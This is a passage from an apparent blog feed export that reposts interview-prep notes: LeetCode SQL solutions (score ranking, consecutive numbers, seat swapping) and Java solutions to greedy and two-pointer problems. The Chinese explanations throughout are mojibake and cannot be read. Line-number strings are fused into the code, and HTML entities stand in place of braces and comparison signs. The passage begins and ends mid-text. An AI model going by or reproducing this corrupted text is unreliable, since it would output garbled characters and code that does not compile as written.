å°†å¾—åˆ†æ’åºï¼Œå¹¶ç»Ÿè®¡æ’åã€‚ 12345678910+-------+------+| Score | Rank |+-------+------+| 4.00 | 1 || 4.00 | 1 || 3.85 | 2 || 3.65 | 3 || 3.65 | 3 || 3.50 | 4 |+-------+------+ SQL Schema123456789101112DROP TABLEIF EXISTS Scores;CREATE TABLE Scores ( Id INT, Score DECIMAL ( 3, 2 ) );INSERT INTO Scores ( Id, Score )VALUES ( 1, 3.5 ), ( 2, 3.65 ), ( 3, 4.0 ), ( 4, 3.85 ), ( 5, 4.0 ), ( 6, 3.65 ); Solution12345678910SELECT S1.score, COUNT( DISTINCT S2.score ) RankFROM Scores S1 INNER JOIN Scores S2 ON S1.score &lt;= S2.scoreGROUP BY S1.idORDER BY S1.score DESC; 180. Consecutive Numbershttps://leetcode.com/problems/consecutive-numbers/description/ Descriptionæ•°å­—è¡¨ï¼š 1234567891011+----+-----+| Id | Num |+----+-----+| 1 | 1 || 2 | 1 || 3 | 1 || 4 | 2 || 5 | 1 || 6 | 2 || 7 | 2 |+----+-----+ æŸ¥æ‰¾è¿ç»­å‡ºç°ä¸‰æ¬¡çš„æ•°å­—ã€‚ 12345+-----------------+| ConsecutiveNums |+-----------------+| 1 |+-----------------+ SQL Schema12345678910111213DROP TABLEIF EXISTS LOGS;CREATE TABLE LOGS ( Id INT, Num INT );INSERT INTO LOGS ( Id, Num )VALUES ( 1, 1 ), ( 2, 1 ), ( 3, 1 ), ( 4, 2 ), ( 5, 1 ), ( 6, 2 ), ( 7, 2 ); Solution12345678910SELECT DISTINCT L1.num ConsecutiveNumsFROM Logs L1, Logs L2, Logs L3WHERE L1.id = l2.id - 1 AND L2.id = L3.id - 1 AND L1.num = L2.num AND l2.num = l3.num; 626. Exchange Seatshttps://leetcode.com/problems/exchange-seats/description/ Descriptionseat è¡¨å­˜å‚¨ç€åº§ä½å¯¹åº”çš„å­¦ç”Ÿã€‚ 123456789+---------+---------+| id | student |+---------+---------+| 1 | Abbot || 2 | Doris || 3 | Emerson || 4 | Green || 5 | Jeames |+---------+---------+ è¦æ±‚äº¤æ¢ç›¸é‚»åº§ä½çš„ä¸¤ä¸ªå­¦ç”Ÿï¼Œå¦‚æœæœ€åä¸€ä¸ªåº§ä½æ˜¯å¥‡æ•°ï¼Œé‚£ä¹ˆä¸äº¤æ¢è¿™ä¸ªåº§ä½ä¸Šçš„å­¦ç”Ÿã€‚ 123456789+---------+---------+| id | student |+---------+---------+| 1 | Doris || 2 | Abbot || 3 | Green || 4 | Emerson || 5 | Jeames |+---------+---------+ SQL Schema1234567891011DROP TABLEIF EXISTS seat;CREATE TABLE seat ( id INT, student VARCHAR ( 255 ) );INSERT INTO seat ( id, student )VALUES ( '1', 'Abbot' ), ( '2', 'Doris' ), ( '3', 'Emerson' ), ( '4', 'Green' ), ( '5', 'Jeames' ); Solutionä½¿ç”¨å¤šä¸ª unionã€‚ 12345678910111213141516171819202122232425SELECT s1.id - 1 AS id, s1.student FROM seat s1 WHERE s1.id MOD 2 = 0 UNIONSELECT s2.id + 1 AS id, s2.student FROM seat s2 WHERE s2.id MOD 2 = 1 AND s2.id != ( SELECT max( s3.id ) FROM seat s3 ) UNIONSELECT s4.id AS id, s4.student FROM seat s4 WHERE s4.id MOD 2 = 1 AND s4.id = ( SELECT max( s5.id ) FROM seat s5 ) ORDER BY id;]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode é¢˜è§£]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FLeetcode%20%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[ç®—æ³•æ€æƒ³ è´ªå¿ƒæ€æƒ³ åŒæŒ‡é’ˆ æ’åº å¿«é€Ÿé€‰æ‹© å †æ’åº æ¡¶æ’åº è·å…°å›½æ——é—®é¢˜ äºŒåˆ†æŸ¥æ‰¾ æœç´¢ BFS DFS Backtracking åˆ†æ²» åŠ¨æ€è§„åˆ’ æ–æ³¢é‚£å¥‘æ•°åˆ— çŸ©é˜µè·¯å¾„ æ•°ç»„åŒºé—´ åˆ†å‰²æ•´æ•° æœ€é•¿é€’å¢å­åºåˆ— æœ€é•¿å…¬å…±å­åºåˆ— 0-1 èƒŒåŒ… è‚¡ç¥¨äº¤æ˜“ å­—ç¬¦ä¸²ç¼–è¾‘ æ•°å­¦ ç´ æ•° æœ€å¤§å…¬çº¦æ•° è¿›åˆ¶è½¬æ¢ é˜¶ä¹˜ å­—ç¬¦ä¸²åŠ æ³•å‡æ³• ç›¸é‡é—®é¢˜ å¤šæ•°æŠ•ç¥¨é—®é¢˜ å…¶å®ƒ æ•°æ®ç»“æ„ç›¸å…³ æ ˆå’Œé˜Ÿåˆ— å“ˆå¸Œè¡¨ å­—ç¬¦ä¸² æ•°ç»„ä¸çŸ©é˜µ é“¾è¡¨ æ ‘ é€’å½’ å±‚æ¬¡éå† å‰ä¸­ååºéå† BST Trie å›¾ äºŒåˆ†å›¾ æ‹“æ‰‘æ’åº å¹¶æŸ¥é›† ä½è¿ç®— å‚è€ƒèµ„æ–™ ç®—æ³•æ€æƒ³è´ªå¿ƒæ€æƒ³è´ªå¿ƒæ€æƒ³ä¿è¯æ¯æ¬¡æ“ä½œéƒ½æ˜¯å±€éƒ¨æœ€ä¼˜çš„ï¼Œå¹¶ä¸”æœ€åå¾—åˆ°çš„ç»“æœæ˜¯å…¨å±€æœ€ä¼˜çš„ã€‚ åˆ†é…é¥¼å¹² 455. Assign Cookies (Easy) 123456Input: [1,2], [1,2,3]Output: 2Explanation: You have 2 children and 3 cookies. The greed factors of 2 children are 1, 2.You have 3 cookies and their sizes are big enough to gratify all of the children,You need to output 2. é¢˜ç›®æè¿°ï¼šæ¯ä¸ªå­©å­éƒ½æœ‰ä¸€ä¸ªæ»¡è¶³åº¦ï¼Œæ¯ä¸ªé¥¼å¹²éƒ½æœ‰ä¸€ä¸ªå¤§å°ï¼Œåªæœ‰é¥¼å¹²çš„å¤§å°å¤§äºç­‰äºä¸€ä¸ªå­©å­çš„æ»¡è¶³åº¦ï¼Œè¯¥å­©å­æ‰ä¼šè·å¾—æ»¡è¶³ã€‚æ±‚è§£æœ€å¤šå¯ä»¥è·å¾—æ»¡è¶³çš„å­©å­æ•°é‡ã€‚ å› ä¸ºæœ€å°çš„å­©å­æœ€å®¹æ˜“å¾—åˆ°æ»¡è¶³ï¼Œå› æ­¤å…ˆæ»¡è¶³æœ€å°å­©å­ã€‚ç»™ä¸€ä¸ªå­©å­çš„é¥¼å¹²åº”å½“å°½é‡å°åˆèƒ½æ»¡è¶³è¯¥å­©å­ï¼Œè¿™æ ·å¤§é¥¼å¹²å°±èƒ½æ‹¿æ¥ç»™æ»¡è¶³åº¦æ¯”è¾ƒå¤§çš„å­©å­ã€‚å› æ­¤è´ªå¿ƒç­–ç•¥ è¯æ˜ï¼šå‡è®¾åœ¨æŸæ¬¡é€‰æ‹©ä¸­ï¼Œè´ªå¿ƒç­–ç•¥é€‰æ‹©ç»™å½“å‰æ»¡è¶³åº¦æœ€å°çš„å­©å­åˆ†é…ç¬¬ m ä¸ªé¥¼å¹²ï¼Œç¬¬ m ä¸ªé¥¼å¹²ä¸ºå¯ä»¥æ»¡è¶³è¯¥å­©å­çš„æœ€å°é¥¼å¹²ã€‚å‡è®¾å­˜åœ¨ä¸€ç§æœ€ä¼˜ç­–ç•¥ï¼Œç»™è¯¥å­©å­åˆ†é…ç¬¬ n ä¸ªé¥¼å¹²ï¼Œå¹¶ä¸” m &lt; nã€‚æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œç»è¿‡è¿™ä¸€è½®åˆ†é…ï¼Œè´ªå¿ƒç­–ç•¥åˆ†é…åå‰©ä¸‹çš„é¥¼å¹²ä¸€å®šæœ‰ä¸€ä¸ªæ¯”æœ€ä¼˜ç­–ç•¥æ¥å¾—å¤§ã€‚å› æ­¤åœ¨åç»­çš„åˆ†é…ä¸­ï¼Œè´ªå¿ƒç­–ç•¥ä¸€å®šèƒ½æ»¡è¶³æ›´å¤šçš„å­©å­ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸å­˜åœ¨æ¯”è´ªå¿ƒç­–ç•¥æ›´ä¼˜çš„ç­–ç•¥ï¼Œå³è´ªå¿ƒç­–ç•¥å°±æ˜¯æœ€ä¼˜ç­–ç•¥ã€‚ 123456789101112public int findContentChildren(int[] g, int[] s) &#123; Arrays.sort(g); Arrays.sort(s); int gi = 0, si = 0; while (gi &lt; g.length &amp;&amp; si &lt; s.length) &#123; if (g[gi] &lt;= s[si]) &#123; gi++; &#125; si++; &#125; return gi;&#125; ä¸é‡å çš„åŒºé—´ä¸ªæ•° 435. Non-overlapping Intervals (Medium) 12345Input: [ [1,2], [1,2], [1,2] ]Output: 2Explanation: You need to remove two [1,2] to make the rest of intervals non-overlapping. 12345Input: [ [1,2], [2,3] ]Output: 0Explanation: You don't need to remove any of the intervals since they're already non-overlapping. é¢˜ç›®æè¿°ï¼šè®¡ç®—è®©ä¸€ç»„åŒºé—´ä¸é‡å æ‰€éœ€è¦ç§»é™¤çš„åŒºé—´ä¸ªæ•°ã€‚ è®¡ç®—æœ€å¤šèƒ½ç»„æˆçš„ä¸é‡å åŒºé—´ä¸ªæ•°ï¼Œç„¶åç”¨åŒºé—´æ€»ä¸ªæ•°å‡å»ä¸é‡å åŒºé—´çš„ä¸ªæ•°ã€‚ åœ¨æ¯æ¬¡é€‰æ‹©ä¸­ï¼ŒåŒºé—´çš„ç»“å°¾æœ€ä¸ºé‡è¦ï¼Œé€‰æ‹©çš„åŒºé—´ç»“å°¾è¶Šå°ï¼Œç•™ç»™åé¢çš„åŒºé—´çš„ç©ºé—´è¶Šå¤§ï¼Œé‚£ä¹ˆåé¢èƒ½å¤Ÿé€‰æ‹©çš„åŒºé—´ä¸ªæ•°ä¹Ÿå°±è¶Šå¤§ã€‚ æŒ‰åŒºé—´çš„ç»“å°¾è¿›è¡Œæ’åºï¼Œæ¯æ¬¡é€‰æ‹©ç»“å°¾æœ€å°ï¼Œå¹¶ä¸”å’Œå‰ä¸€ä¸ªåŒºé—´ä¸é‡å çš„åŒºé—´ã€‚ 12345678910111213141516public int eraseOverlapIntervals(Interval[] intervals) &#123; if (intervals.length == 0) &#123; return 0; &#125; Arrays.sort(intervals, Comparator.comparingInt(o -&gt; o.end)); int cnt = 1; int end = intervals[0].end; for (int i = 1; i &lt; intervals.length; i++) &#123; if (intervals[i].start &lt; end) &#123; continue; &#125; end = intervals[i].end; cnt++; &#125; return intervals.length - cnt;&#125; ä½¿ç”¨ lambda è¡¨ç¤ºå¼åˆ›å»º Comparator ä¼šå¯¼è‡´ç®—æ³•è¿è¡Œæ—¶é—´è¿‡é•¿ï¼Œå¦‚æœæ³¨é‡è¿è¡Œæ—¶é—´ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºæ™®é€šåˆ›å»º Comparator è¯­å¥ï¼š 123456Arrays.sort(intervals, new Comparator&lt;Interval&gt;() &#123; @Override public int compare(Interval o1, Interval o2) &#123; return o1.end - o2.end; &#125;&#125;); æŠ•é£é•–åˆºç ´æ°”çƒ 452. Minimum Number of Arrows to Burst Balloons (Medium) 12345Input:[[10,16], [2,8], [1,6], [7,12]]Output:2 é¢˜ç›®æè¿°ï¼šæ°”çƒåœ¨ä¸€ä¸ªæ°´å¹³æ•°è½´ä¸Šæ‘†æ”¾ï¼Œå¯ä»¥é‡å ï¼Œé£é•–å‚ç›´æŠ•å‘åæ ‡è½´ï¼Œä½¿å¾—è·¯å¾„ä¸Šçš„æ°”çƒéƒ½ä¼šåˆºç ´ã€‚æ±‚è§£æœ€å°çš„æŠ•é£é•–æ¬¡æ•°ä½¿æ‰€æœ‰æ°”çƒéƒ½è¢«åˆºç ´ã€‚ ä¹Ÿæ˜¯è®¡ç®—ä¸é‡å çš„åŒºé—´ä¸ªæ•°ï¼Œä¸è¿‡å’Œ Non-overlapping Intervals çš„åŒºåˆ«åœ¨äºï¼Œ[1, 2] å’Œ [2, 3] åœ¨æœ¬é¢˜ä¸­ç®—æ˜¯é‡å åŒºé—´ã€‚ 123456789101112131415public int findMinArrowShots(int[][] points) &#123; if (points.length == 0) &#123; return 0; &#125; Arrays.sort(points, Comparator.comparingInt(o -&gt; o[1])); int cnt = 1, end = points[0][1]; for (int i = 1; i &lt; points.length; i++) &#123; if (points[i][0] &lt;= end) &#123; continue; &#125; cnt++; end = points[i][1]; &#125; return cnt;&#125; æ ¹æ®èº«é«˜å’Œåºå·é‡ç»„é˜Ÿåˆ— 406. Queue Reconstruction by Height(Medium) 12345Input:[[7,0], [4,4], [7,1], [5,0], [6,1], [5,2]]Output:[[5,0], [7,0], [5,2], [6,1], [4,4], [7,1]] é¢˜ç›®æè¿°ï¼šä¸€ä¸ªå­¦ç”Ÿç”¨ä¸¤ä¸ªåˆ†é‡ (h, k) æè¿°ï¼Œh è¡¨ç¤ºèº«é«˜ï¼Œk è¡¨ç¤ºæ’åœ¨å‰é¢çš„æœ‰ k ä¸ªå­¦ç”Ÿçš„èº«é«˜æ¯”ä»–é«˜æˆ–è€…å’Œä»–ä¸€æ ·é«˜ã€‚ ä¸ºäº†åœ¨æ¯æ¬¡æ’å…¥æ“ä½œæ—¶ä¸å½±å“åç»­çš„æ“ä½œï¼Œèº«é«˜è¾ƒé«˜çš„å­¦ç”Ÿåº”è¯¥å…ˆåšæ’å…¥æ“ä½œï¼Œå¦åˆ™èº«é«˜è¾ƒå°çš„å­¦ç”ŸåŸå…ˆæ­£ç¡®æ’å…¥ç¬¬ k ä¸ªä½ç½®å¯èƒ½ä¼šå˜æˆç¬¬ k+1 ä¸ªä½ç½®ã€‚ èº«é«˜é™åºã€k å€¼å‡åºï¼Œç„¶åæŒ‰æ’å¥½åºçš„é¡ºåºæ’å…¥é˜Ÿåˆ—çš„ç¬¬ k ä¸ªä½ç½®ä¸­ã€‚ 1234567891011public int[][] reconstructQueue(int[][] people) &#123; if (people == null || people.length == 0 || people[0].length == 0) &#123; return new int[0][0]; &#125; Arrays.sort(people, (a, b) -&gt; (a[0] == b[0] ? a[1] - b[1] : b[0] - a[0])); List&lt;int[]&gt; queue = new ArrayList&lt;&gt;(); for (int[] p : people) &#123; queue.add(p[1], p); &#125; return queue.toArray(new int[queue.size()][]);&#125; åˆ†éš”å­—ç¬¦ä¸²ä½¿åŒç§å­—ç¬¦å‡ºç°åœ¨ä¸€èµ· 763. Partition Labels (Medium) 123456Input: S = "ababcbacadefegdehijhklij"Output: [9,7,8]Explanation:The partition is "ababcbaca", "defegde", "hijhklij".This is a partition so that each letter appears in at most one part.A partition like "ababcbacadefegde", "hijhklij" is incorrect, because it splits S into less parts. 123456789101112131415161718192021222324public List&lt;Integer&gt; partitionLabels(String S) &#123; int[] lastIndexsOfChar = new int[26]; for (int i = 0; i &lt; S.length(); i++) &#123; lastIndexsOfChar[char2Index(S.charAt(i))] = i; &#125; List&lt;Integer&gt; partitions = new ArrayList&lt;&gt;(); int firstIndex = 0; while (firstIndex &lt; S.length()) &#123; int lastIndex = firstIndex; for (int i = firstIndex; i &lt; S.length() &amp;&amp; i &lt;= lastIndex; i++) &#123; int index = lastIndexsOfChar[char2Index(S.charAt(i))]; if (index &gt; lastIndex) &#123; lastIndex = index; &#125; &#125; partitions.add(lastIndex - firstIndex + 1); firstIndex = lastIndex + 1; &#125; return partitions;&#125;private int char2Index(char c) &#123; return c - 'a';&#125; ç§æ¤èŠ±æœµ 605. Can Place Flowers (Easy) 12Input: flowerbed = [1,0,0,0,1], n = 1Output: True é¢˜ç›®æè¿°ï¼šèŠ±æœµä¹‹é—´è‡³å°‘éœ€è¦ä¸€ä¸ªå•ä½çš„é—´éš”ï¼Œæ±‚è§£æ˜¯å¦èƒ½ç§ä¸‹ n æœµèŠ±ã€‚ 12345678910111213141516public boolean canPlaceFlowers(int[] flowerbed, int n) &#123; int len = flowerbed.length; int cnt = 0; for (int i = 0; i &lt; len &amp;&amp; cnt &lt; n; i++) &#123; if (flowerbed[i] == 1) &#123; continue; &#125; int pre = i == 0 ? 0 : flowerbed[i - 1]; int next = i == len - 1 ? 0 : flowerbed[i + 1]; if (pre == 0 &amp;&amp; next == 0) &#123; cnt++; flowerbed[i] = 1; &#125; &#125; return cnt &gt;= n;&#125; åˆ¤æ–­æ˜¯å¦ä¸ºå­åºåˆ— 392. Is Subsequence (Medium) 12s = "abc", t = "ahbgdc"Return true. 12345678910public boolean isSubsequence(String s, String t) &#123; int index = -1; for (char c : s.toCharArray()) &#123; index = t.indexOf(c, index + 1); if (index == -1) &#123; return false; &#125; &#125; return true;&#125; ä¿®æ”¹ä¸€ä¸ªæ•°æˆä¸ºéé€’å‡æ•°ç»„ 665. Non-decreasing Array (Easy) 123Input: [4,2,3]Output: TrueExplanation: You could modify the first 4 to 1 to get a non-decreasing array. é¢˜ç›®æè¿°ï¼šåˆ¤æ–­ä¸€ä¸ªæ•°ç»„èƒ½ä¸èƒ½åªä¿®æ”¹ä¸€ä¸ªæ•°å°±æˆä¸ºéé€’å‡æ•°ç»„ã€‚ åœ¨å‡ºç° nums[i] &lt; nums[i - 1] æ—¶ï¼Œéœ€è¦è€ƒè™‘çš„æ˜¯åº”è¯¥ä¿®æ”¹æ•°ç»„çš„å“ªä¸ªæ•°ï¼Œä½¿å¾—æœ¬æ¬¡ä¿®æ”¹èƒ½ä½¿ i ä¹‹å‰çš„æ•°ç»„æˆä¸ºéé€’å‡æ•°ç»„ï¼Œå¹¶ä¸” ä¸å½±å“åç»­çš„æ“ä½œ ã€‚ä¼˜å…ˆè€ƒè™‘ä»¤ nums[i - 1] = nums[i]ï¼Œå› ä¸ºå¦‚æœä¿®æ”¹ nums[i] = nums[i - 1] çš„è¯ï¼Œé‚£ä¹ˆ nums[i] è¿™ä¸ªæ•°ä¼šå˜å¤§ï¼Œå°±æœ‰å¯èƒ½æ¯” nums[i + 1] å¤§ï¼Œä»è€Œå½±å“äº†åç»­æ“ä½œã€‚è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒç‰¹åˆ«çš„æƒ…å†µå°±æ˜¯ nums[i] &lt; nums[i - 2]ï¼Œåªä¿®æ”¹ nums[i - 1] = nums[i] ä¸èƒ½ä½¿æ•°ç»„æˆä¸ºéé€’å‡æ•°ç»„ï¼Œåªèƒ½ä¿®æ”¹ nums[i] = nums[i - 1]ã€‚ 123456789101112131415public boolean checkPossibility(int[] nums) &#123; int cnt = 0; for (int i = 1; i &lt; nums.length &amp;&amp; cnt &lt; 2; i++) &#123; if (nums[i] &gt;= nums[i - 1]) &#123; continue; &#125; cnt++; if (i - 2 &gt;= 0 &amp;&amp; nums[i - 2] &gt; nums[i]) &#123; nums[i] = nums[i - 1]; &#125; else &#123; nums[i - 1] = nums[i]; &#125; &#125; return cnt &lt;= 1;&#125; è‚¡ç¥¨çš„æœ€å¤§æ”¶ç›Š 122. Best Time to Buy and Sell Stock II (Easy) é¢˜ç›®æè¿°ï¼šä¸€æ¬¡è‚¡ç¥¨äº¤æ˜“åŒ…å«ä¹°å…¥å’Œå–å‡ºï¼Œå¤šä¸ªäº¤æ˜“ä¹‹é—´ä¸èƒ½äº¤å‰è¿›è¡Œã€‚ å¯¹äº [a, b, c, d]ï¼Œå¦‚æœæœ‰ a &lt;= b &lt;= c &lt;= d ï¼Œé‚£ä¹ˆæœ€å¤§æ”¶ç›Šä¸º d - aã€‚è€Œ d - a = (d - c) + (c - b) + (b - a) ï¼Œå› æ­¤å½“è®¿é—®åˆ°ä¸€ä¸ª prices[i] ä¸” prices[i] - prices[i-1] &gt; 0ï¼Œé‚£ä¹ˆå°±æŠŠ prices[i] - prices[i-1] æ·»åŠ åˆ°æ”¶ç›Šä¸­ï¼Œä»è€Œåœ¨å±€éƒ¨æœ€ä¼˜çš„æƒ…å†µä¸‹ä¹Ÿä¿è¯å…¨å±€æœ€ä¼˜ã€‚ 123456789public int maxProfit(int[] prices) &#123; int profit = 0; for (int i = 1; i &lt; prices.length; i++) &#123; if (prices[i] &gt; prices[i - 1]) &#123; profit += (prices[i] - prices[i - 1]); &#125; &#125; return profit;&#125; åŒæŒ‡é’ˆåŒæŒ‡é’ˆä¸»è¦ç”¨äºéå†æ•°ç»„ï¼Œä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸åŒçš„å…ƒç´ ï¼Œä»è€ŒååŒå®Œæˆä»»åŠ¡ã€‚ æœ‰åºæ•°ç»„çš„ Two Sum Leetcode ï¼š167. Two Sum II - Input array is sorted (Easy) 12Input: numbers=&#123;2, 7, 11, 15&#125;, target=9Output: index1=1, index2=2 é¢˜ç›®æè¿°ï¼šåœ¨æœ‰åºæ•°ç»„ä¸­æ‰¾å‡ºä¸¤ä¸ªæ•°ï¼Œä½¿å®ƒä»¬çš„å’Œä¸º targetã€‚ ä½¿ç”¨åŒæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å€¼è¾ƒå°çš„å…ƒç´ ï¼Œä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å€¼è¾ƒå¤§çš„å…ƒç´ ã€‚æŒ‡å‘è¾ƒå°å…ƒç´ çš„æŒ‡é’ˆä»å¤´å‘å°¾éå†ï¼ŒæŒ‡å‘è¾ƒå¤§å…ƒç´ çš„æŒ‡é’ˆä»å°¾å‘å¤´éå†ã€‚ å¦‚æœä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘å…ƒç´ çš„å’Œ sum == targetï¼Œé‚£ä¹ˆå¾—åˆ°è¦æ±‚çš„ç»“æœï¼›å¦‚æœ sum &gt; targetï¼Œç§»åŠ¨è¾ƒå¤§çš„å…ƒç´ ï¼Œä½¿ sum å˜å°ä¸€äº›ï¼›å¦‚æœ sum &lt; targetï¼Œç§»åŠ¨è¾ƒå°çš„å…ƒç´ ï¼Œä½¿ sum å˜å¤§ä¸€äº›ã€‚ 1234567891011121314public int[] twoSum(int[] numbers, int target) &#123; int i = 0, j = numbers.length - 1; while (i &lt; j) &#123; int sum = numbers[i] + numbers[j]; if (sum == target) &#123; return new int[]&#123;i + 1, j + 1&#125;; &#125; else if (sum &lt; target) &#123; i++; &#125; else &#123; j--; &#125; &#125; return null;&#125; ä¸¤æ•°å¹³æ–¹å’Œ 633. Sum of Square Numbers (Easy) 123Input: 5Output: TrueExplanation: 1 * 1 + 2 * 2 = 5 é¢˜ç›®æè¿°ï¼šåˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºä¸¤ä¸ªæ•°çš„å¹³æ–¹å’Œï¼Œä¾‹å¦‚ 5 = 12 + 22ã€‚ 1234567891011121314public boolean judgeSquareSum(int c) &#123; int i = 0, j = (int) Math.sqrt(c); while (i &lt;= j) &#123; int powSum = i * i + j * j; if (powSum == c) &#123; return true; &#125; else if (powSum &gt; c) &#123; j--; &#125; else &#123; i++; &#125; &#125; return false;&#125; åè½¬å­—ç¬¦ä¸²ä¸­çš„å…ƒéŸ³å­—ç¬¦ 345. Reverse Vowels of a String (Easy) 1Given s = "leetcode", return "leotcede". ä½¿ç”¨åŒæŒ‡é’ˆï¼ŒæŒ‡å‘å¾…åè½¬çš„ä¸¤ä¸ªå…ƒéŸ³å­—ç¬¦ï¼Œä¸€ä¸ªæŒ‡é’ˆä»å¤´å‘å°¾éå†ï¼Œä¸€ä¸ªæŒ‡é’ˆä»å°¾åˆ°å¤´éå†ã€‚ 12345678910111213141516171819private final static HashSet&lt;Character&gt; vowels = new HashSet&lt;&gt;(Arrays.asList('a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U'));public String reverseVowels(String s) &#123; int i = 0, j = s.length() - 1; char[] result = new char[s.length()]; while (i &lt;= j) &#123; char ci = s.charAt(i); char cj = s.charAt(j); if (!vowels.contains(ci)) &#123; result[i++] = ci; &#125; else if (!vowels.contains(cj)) &#123; result[j--] = cj; &#125; else &#123; result[i++] = cj; result[j--] = ci; &#125; &#125; return new String(result);&#125; å›æ–‡å­—ç¬¦ä¸² 680. Valid Palindrome II (Easy) 123Input: "abca"Output: TrueExplanation: You could delete the character 'c'. é¢˜ç›®æè¿°ï¼šå¯ä»¥åˆ é™¤ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ¤æ–­æ˜¯å¦èƒ½æ„æˆå›æ–‡å­—ç¬¦ä¸²ã€‚ 123456789101112131415161718public boolean validPalindrome(String s) &#123; int i = -1, j = s.length(); while (++i &lt; --j) &#123; if (s.charAt(i) != s.charAt(j)) &#123; return isPalindrome(s, i, j - 1) || isPalindrome(s, i + 1, j); &#125; &#125; return true;&#125;private boolean isPalindrome(String s, int i, int j) &#123; while (i &lt; j) &#123; if (s.charAt(i++) != s.charAt(j--)) &#123; return false; &#125; &#125; return true;&#125; å½’å¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„ 88. Merge Sorted Array (Easy) 12345Input:nums1 = [1,2,3,0,0,0], m = 3nums2 = [2,5,6], n = 3Output: [1,2,2,3,5,6] é¢˜ç›®æè¿°ï¼šæŠŠå½’å¹¶ç»“æœå­˜åˆ°ç¬¬ä¸€ä¸ªæ•°ç»„ä¸Šã€‚ éœ€è¦ä»å°¾å¼€å§‹éå†ï¼Œå¦åˆ™åœ¨ nums1 ä¸Šå½’å¹¶å¾—åˆ°çš„å€¼ä¼šè¦†ç›–è¿˜æœªè¿›è¡Œå½’å¹¶æ¯”è¾ƒçš„å€¼ 123456789101112131415public void merge(int[] nums1, int m, int[] nums2, int n) &#123; int index1 = m - 1, index2 = n - 1; int indexMerge = m + n - 1; while (index1 &gt;= 0 || index2 &gt;= 0) &#123; if (index1 &lt; 0) &#123; nums1[indexMerge--] = nums2[index2--]; &#125; else if (index2 &lt; 0) &#123; nums1[indexMerge--] = nums1[index1--]; &#125; else if (nums1[index1] &gt; nums2[index2]) &#123; nums1[indexMerge--] = nums1[index1--]; &#125; else &#123; nums1[indexMerge--] = nums2[index2--]; &#125; &#125;&#125; åˆ¤æ–­é“¾è¡¨æ˜¯å¦å­˜åœ¨ç¯ 141. Linked List Cycle (Easy) ä½¿ç”¨åŒæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡é’ˆæ¯æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸€ä¸ªæŒ‡é’ˆæ¯æ¬¡ç§»åŠ¨ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœå­˜åœ¨ç¯ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæŒ‡é’ˆä¸€å®šä¼šç›¸é‡ã€‚ 1234567891011121314public boolean hasCycle(ListNode head) &#123; if (head == null) &#123; return false; &#125; ListNode l1 = head, l2 = head.next; while (l1 != null &amp;&amp; l2 != null &amp;&amp; l2.next != null) &#123; if (l1 == l2) &#123; return true; &#125; l1 = l1.next; l2 = l2.next.next; &#125; return false;&#125; æœ€é•¿å­åºåˆ— 524. Longest Word in Dictionary through Deleting (Medium) 12345Input:s = &quot;abpcplea&quot;, d = [&quot;ale&quot;,&quot;apple&quot;,&quot;monkey&quot;,&quot;plea&quot;]Output:&quot;apple&quot; é¢˜ç›®æè¿°ï¼šåˆ é™¤ s ä¸­çš„ä¸€äº›å­—ç¬¦ï¼Œä½¿å¾—å®ƒæ„æˆå­—ç¬¦ä¸²åˆ—è¡¨ d ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰¾å‡ºèƒ½æ„æˆçš„æœ€é•¿å­—ç¬¦ä¸²ã€‚å¦‚æœæœ‰å¤šä¸ªç›¸åŒé•¿åº¦çš„ç»“æœï¼Œè¿”å›æŒ‰å­—å…¸åºæ’åºçš„æœ€å¤§å­—ç¬¦ä¸²ã€‚ 123456789101112131415161718192021222324public String findLongestWord(String s, List&lt;String&gt; d) &#123; String longestWord = ""; for (String target : d) &#123; int l1 = longestWord.length(), l2 = target.length(); if (l1 &gt; l2 || (l1 == l2 &amp;&amp; longestWord.compareTo(target) &lt; 0)) &#123; continue; &#125; if (isValid(s, target)) &#123; longestWord = target; &#125; &#125; return longestWord;&#125;private boolean isValid(String s, String target) &#123; int i = 0, j = 0; while (i &lt; s.length() &amp;&amp; j &lt; target.length()) &#123; if (s.charAt(i) == target.charAt(j)) &#123; j++; &#125; i++; &#125; return j == target.length();&#125; æ’åºå¿«é€Ÿé€‰æ‹©ä¸€èˆ¬ç”¨äºæ±‚è§£ Kth Element é—®é¢˜ï¼Œå¯ä»¥åœ¨ O(N) æ—¶é—´å¤æ‚åº¦ï¼ŒO(1) ç©ºé—´å¤æ‚åº¦å®Œæˆæ±‚è§£å·¥ä½œã€‚ ä¸å¿«é€Ÿæ’åºä¸€æ ·ï¼Œå¿«é€Ÿé€‰æ‹©ä¸€èˆ¬éœ€è¦å…ˆæ‰“ä¹±æ•°ç»„ï¼Œå¦åˆ™æœ€åæƒ…å†µä¸‹æ—¶é—´å¤æ‚åº¦ä¸º O(N2)ã€‚ å †æ’åºå †æ’åºç”¨äºæ±‚è§£ TopK Elements é—®é¢˜ï¼Œé€šè¿‡ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸º K çš„å †ï¼Œå †ä¸­çš„å…ƒç´ å°±æ˜¯ TopK Elementsã€‚å½“ç„¶å®ƒä¹Ÿå¯ä»¥ç”¨äºæ±‚è§£ Kth Element é—®é¢˜ï¼Œå †é¡¶å…ƒç´ å°±æ˜¯ Kth 